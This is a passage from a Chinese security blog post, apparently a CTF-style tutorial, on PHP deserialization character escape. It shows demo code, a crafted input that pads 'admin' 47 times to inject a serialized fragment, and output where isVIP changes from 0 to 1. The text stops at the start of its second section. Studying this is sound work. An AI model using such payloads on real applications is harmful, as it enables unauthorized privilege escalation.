@@ -1,0 +1,825 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="php反序列化字符逃逸php反序列化字符逃逸的原理当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。 php反序列化字符逃逸分类 过滤后字符变多 过滤后字符变少  过滤后字符变多我们先定义一个类 user ,成员变量 username，password，isVIP，并且序列化 123456789101112131415&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化字符逃逸">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="php反序列化字符逃逸php反序列化字符逃逸的原理当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。 php反序列化字符逃逸分类 过滤后字符变多 过滤后字符变少  过滤后字符变多我们先定义一个类 user ,成员变量 username，password，isVIP，并且序列化 123456789101112131415&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/01/04/KvXBduNPCS8A9qF.png">
+<meta property="og:image" content="https://s2.loli.net/2023/01/04/QmBVMJCvFbYZ8cx.jpg">
+<meta property="og:image" content="https://s2.loli.net/2023/01/04/jnr7t4KDGWmdl2S.jpg">
+<meta property="article:published_time" content="2023-08-24T14:38:04.614Z">
+<meta property="article:modified_time" content="2023-06-05T06:58:40.431Z">
+<meta property="article:author" content="leekos">
+<meta property="article:tag" content="php反序列化字符逃逸">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/01/04/KvXBduNPCS8A9qF.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>php反序列化字符逃逸 - Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php反序列化字符逃逸"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 22:38" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          74 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">php反序列化字符逃逸</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年6月5日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="php反序列化字符逃逸"><a href="#php反序列化字符逃逸" class="headerlink" title="php反序列化字符逃逸"></a>php反序列化字符逃逸</h1><h3 id="php反序列化字符逃逸的原理"><a href="#php反序列化字符逃逸的原理" class="headerlink" title="php反序列化字符逃逸的原理"></a>php反序列化字符逃逸的原理</h3><p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。</p>
+<h3 id="php反序列化字符逃逸分类"><a href="#php反序列化字符逃逸分类" class="headerlink" title="php反序列化字符逃逸分类"></a>php反序列化字符逃逸分类</h3><blockquote>
+<p>过滤后<strong>字符变多</strong></p>
+<p>过滤后<strong>字符变少</strong></p>
+</blockquote>
+<h3 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h3><p>我们先定义一个类 <code>user</code> ,成员变量 <code>username</code>，<code>password</code>，<code>isVIP</code>，并且序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>	&#125;<br>&#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br></code></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们可以看到，我们user类的对象默认 isVIP&#x3D;0，并且不受传入参数的影响</p>
+<p>这时我们增加一个过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>完整代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br></code></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此时，<code>admin</code>在序列化串中已经变成了 <code>hacker</code> ，并且字符串长度比5多了一个，变成了6</p>
+<p>我们对比一下两次的输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<span class="hljs-comment">//过滤前</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125; <span class="hljs-comment">//过滤后</span><br></code></pre></td></tr></table></figure>
+
+<p>我们想要构造，将 isVIP的值变成 1，如何才能做到呢？<code>admin位置</code>现有字串与目标字串如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:0;&#125; //现有字串</span><br><span class="hljs-string">&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">1</span>;&#125; <span class="hljs-comment">//目标字串</span><br></code></pre></td></tr></table></figure>
+
+<p>我们知道，传入的admin位置是<strong>可控变量</strong> ，所以我们需要在该位置插入目标字串，</p>
+<p>目标字串的 <code>&quot;;</code> 将admin参数位置处的双引号闭合，即可造成字符逃逸</p>
+<p>但是我们admin参数位置处的字符串长度对应不上，由于我们需要逃逸出来的字符串为：</p>
+<p><code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> 其长度为47.</p>
+<p>这就导致我们admin传参位置的参数少了47长度，必须再添加47长度才行，但是怎么添加呢？</p>
+<p>我们知道，每次过滤的时候，<code>admin</code> 会变为：<code>hacker</code> 长度加了1，所以我们传参时可以重复47次 <code>admin</code>。这样我们的参数就会增加47长度，再减去逃逸的47长度字符串，长度就合适了。</p>
+<p>可控变量修改如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:1;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>完整的代码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>, <span class="hljs-string">&quot;123456&quot;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.PHP_EOL;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">282</span>:<span class="hljs-string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">1</span>;&#125;<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:0;&#125;</span><br><span class="hljs-string">O:4:&quot;</span>user<span class="hljs-string">&quot;:3:&#123;s:8:&quot;</span>username<span class="hljs-string">&quot;;s:282:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:1;&#125;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;user <span class="hljs-title function_ invoke__">Object</span><br>(<br>    [username] =&gt; hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<br>    [password] =&gt; <span class="hljs-number">123456</span><br>    [isVIP] =&gt; <span class="hljs-number">1</span><br>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>反序列化后，多余的子串会被抛弃</strong>, 在大括号 } 之外的原先字串就被抛弃了：</p>
+<p><code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code></p>
+<p>我们观察反序列化之后的输出 isVIP&#x3D;1，反序列化字符串逃逸已经成功了。</p>
+<h3 id="过滤后字符串变少"><a href="#过滤后字符串变少" class="headerlink" title="过滤后字符串变少"></a>过滤后字符串变少</h3><p>我们将上面过滤参数中 <code>hacker</code> 改为 <code>hack</code>，其余代码不变：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br></code></pre></td></tr></table></figure>
+
+<p>输出：</p>
